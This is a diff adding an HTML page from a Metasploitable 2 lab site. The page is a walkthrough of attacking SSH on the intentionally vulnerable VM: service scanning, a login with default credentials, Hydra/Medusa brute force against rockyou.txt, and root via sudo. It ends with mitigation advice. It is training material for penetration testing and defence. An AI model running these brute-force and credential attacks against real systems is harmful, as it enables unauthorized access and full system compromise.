@@ -1,1 +1,208 @@
-hear the readme content of ssh should be there
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SSH — Weak Credential Exploit | Metasploitable 2 Lab</title>
+  <link rel="stylesheet" href="../assets/css/style.css" />
+</head>
+<body>
+
+<nav class="site-nav">
+  <div class="container nav-inner">
+    <a class="nav-brand" href="../index.html">
+      <div class="brand-icon">M2</div>
+      <div class="brand-text"><h1>Metasploitable 2</h1><p>Penetration Testing Lab</p></div>
+    </a>
+    <div class="nav-links">
+      <a class="nav-link" href="../index.html#overview">Overview</a>
+      <a class="nav-link" href="../index.html#scan">Nmap Scan</a>
+      <a class="nav-link" href="../index.html#modules">Modules</a>
+    </div>
+    <a class="nav-btn btn" href="../index.html#modules">All Modules</a>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="breadcrumb">
+    <a href="../index.html">Home</a>
+    <span>/</span>
+    <a href="../index.html#modules">Modules</a>
+    <span>/</span>
+    <span style="color:var(--text)">SSH</span>
+  </div>
+</div>
+
+<div class="module-hero">
+  <div class="container">
+    <div class="module-hero-top">
+      <div class="module-title-wrap">
+        <p class="section-label">Port 22/tcp — Secure Shell</p>
+        <h2>SSH — Weak Credential Exploit</h2>
+        <p class="sub-title">Brute Force Login → Local Shell → Privilege Escalation to Root</p>
+        <div class="overview-pills">
+          <span class="pill">CVE: <strong>N/A (Misconfiguration)</strong></span>
+          <span class="pill">Port: <strong>22/tcp</strong></span>
+          <span class="pill">Impact: <strong>Unauthorized Shell Access</strong></span>
+          <span class="pill">Tool: <strong>Medusa / Hydra</strong></span>
+        </div>
+      </div>
+      <span class="badge badge-high" style="font-size:.85rem;padding:.4rem 1rem">High</span>
+    </div>
+    <div class="overview-box">
+      <div class="overview-box-grid">
+        <div><div class="ov-item-label">Vulnerability Name</div><div class="ov-item-value">SSH Default / Weak Credentials</div></div>
+        <div><div class="ov-item-label">Attack Type</div><div class="ov-item-value">Credential Brute Force</div></div>
+        <div><div class="ov-item-label">Known Accounts</div><div class="ov-item-value mono">msfadmin, user, postgres, root</div></div>
+        <div><div class="ov-item-label">Result</div><div class="ov-item-value" style="color:var(--green)">✓ Root Shell via sudo</div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="content-layout">
+    <main class="content-body">
+
+      <div class="step-section" id="service-overview">
+        <div class="step-label"><div class="step-num">01</div><h3>Vulnerability Overview</h3></div>
+        <p>SSH (Secure Shell) is a cryptographic protocol for secure remote access. On Metasploitable 2, SSH runs on port 22 via <strong>OpenSSH 4.7p1</strong>. The SSH service itself is not technically vulnerable — the weakness is the presence of multiple default accounts with trivially guessable passwords.</p>
+        <div class="callout">
+          Metasploitable 2 ships with several default user accounts (<code>msfadmin</code>, <code>user</code>, <code>postgres</code>, <code>root</code>) whose passwords are identical to their usernames. This makes brute-force trivial.
+        </div>
+      </div>
+
+      <div class="step-section" id="enumeration">
+        <div class="step-label"><div class="step-num">02</div><h3>Service Detection</h3></div>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">nmap</span> <span class="kw">-sV -v -p 22</span> <span class="str">&lt;target-ip&gt;</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Nmap SSH Service Version Scan</span>
+          </div>
+          <img src="../SSH/SSH_Nmap_Service_Scan.png" alt="SSH Nmap Scan" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="manual-login">
+        <div class="step-label"><div class="step-num">03</div><h3>Manual Login — Default Credentials</h3></div>
+        <p>Metasploitable 2 uses legacy SSH key exchange algorithms. Modern SSH clients may refuse to connect without explicitly allowing them:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmt"># Standard login attempt (may fail on modern clients)</span>
+<span class="cmd">ssh</span> msfadmin@<span class="str">&lt;target-ip&gt;</span>
+<span class="cmt"># Password: msfadmin</span>
+
+<span class="cmt"># Force legacy algorithm support for older targets</span>
+<span class="cmd">ssh</span> <span class="kw">-oHostKeyAlgorithms=+ssh-rsa</span> <span class="kw">-oPubkeyAcceptedKeyTypes=+ssh-rsa</span> \
+    msfadmin@<span class="str">&lt;target-ip&gt;</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Default Credential SSH Login — msfadmin</span>
+          </div>
+          <img src="../SSH/Default_Credential_SSH_login.png" alt="SSH Login" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="bruteforce">
+        <div class="step-label"><div class="step-num">04</div><h3>Automated Bruteforce — Medusa</h3></div>
+        <p>Hydra may fail against Metasploitable 2 due to outdated SSH algorithm support. <strong>Medusa</strong> handles the legacy algorithms correctly:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmt"># Hydra (may fail due to legacy SSH algorithms)</span>
+<span class="cmd">hydra</span> <span class="kw">-l</span> msfadmin <span class="kw">-P</span> <span class="pth">/usr/share/wordlists/rockyou.txt</span> ssh://<span class="str">&lt;target-ip&gt;</span>
+
+<span class="cmt"># Medusa — recommended for Metasploitable 2</span>
+<span class="cmd">medusa</span> <span class="kw">-h</span> <span class="str">&lt;target-ip&gt;</span> <span class="kw">-u</span> msfadmin <span class="kw">-P</span> <span class="pth">/usr/share/wordlists/rockyou.txt</span> <span class="kw">-M</span> ssh</pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Medusa SSH Bruteforce — Password Found</span>
+          </div>
+          <img src="../SSH/SSH_Bruteforce_Medusa.png" alt="SSH Bruteforce Medusa" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="privesc">
+        <div class="step-label"><div class="step-num">05</div><h3>Privilege Escalation</h3></div>
+        <p>After gaining a local user shell as <code>msfadmin</code>, check sudo permissions:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmt"># Check sudo capabilities</span>
+<span class="cmd">sudo</span> -l
+<span class="cmt"># Enter password: msfadmin</span>
+
+<span class="cmt"># Escalate to root</span>
+<span class="cmd">sudo su</span>
+<span class="cmt"># or</span>
+<span class="cmd">sudo -i</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Privilege Escalation via sudo — Root Shell</span>
+          </div>
+          <img src="../SSH/SSH_Priv_Esc.png" alt="SSH Privilege Escalation" loading="lazy" />
+        </div>
+        <p>The <code>msfadmin</code> account has unrestricted <code>sudo</code> access, making privilege escalation trivial using the same default password.</p>
+      </div>
+
+      <div class="step-section" id="results">
+        <div class="step-label"><div class="step-num">06</div><h3>Results &amp; Impact</h3></div>
+        <div class="results-box">
+          <h4>Outcome</h4>
+          <ul>
+            <li>User shell obtained via default/weak SSH credentials</li>
+            <li>Root shell achieved through unrestricted sudo access</li>
+            <li>Full system compromise demonstrated</li>
+            <li>Attack works both manually and via automated bruteforce</li>
+          </ul>
+        </div>
+        <div class="mitigation-box">
+          <h4>Detection &amp; Mitigation (Blue Team)</h4>
+          <ul>
+            <li>Disable all default accounts (<code>msfadmin</code>, <code>user</code>, etc.) or change passwords</li>
+            <li>Enforce strong, unique passwords — never match username</li>
+            <li>Disable SSH password authentication; use key-based auth only</li>
+            <li>Upgrade SSH to support only modern key exchange algorithms</li>
+            <li>Restrict sudo usage — apply principle of least privilege</li>
+            <li>Deploy fail2ban or similar to block repeated login failures</li>
+            <li>Monitor <code>/var/log/auth.log</code> for bruteforce patterns</li>
+          </ul>
+        </div>
+      </div>
+
+    </main>
+
+    <aside class="toc">
+      <div class="toc-title">On This Page</div>
+      <a href="#service-overview">Overview</a>
+      <a href="#enumeration">Enumeration</a>
+      <a href="#manual-login">Manual Login</a>
+      <a href="#bruteforce">Bruteforce</a>
+      <a href="#privesc">Privilege Escalation</a>
+      <a href="#results">Results</a>
+    </aside>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="container footer-inner">
+    <div class="footer-left">← <a href="../index.html#modules" style="color:var(--cyan)">Back to Modules</a></div>
+    <div class="footer-links"><a href="./ftp.html">← FTP</a><a href="./telnet.html">Telnet →</a></div>
+  </div>
+</footer>
+
+<div id="lightbox" class="lightbox-overlay">
+  <button class="lightbox-close">✕</button>
+  <img src="" alt="" />
+</div>
+<script src="../assets/js/app.js"></script>
+</body>
+</html>
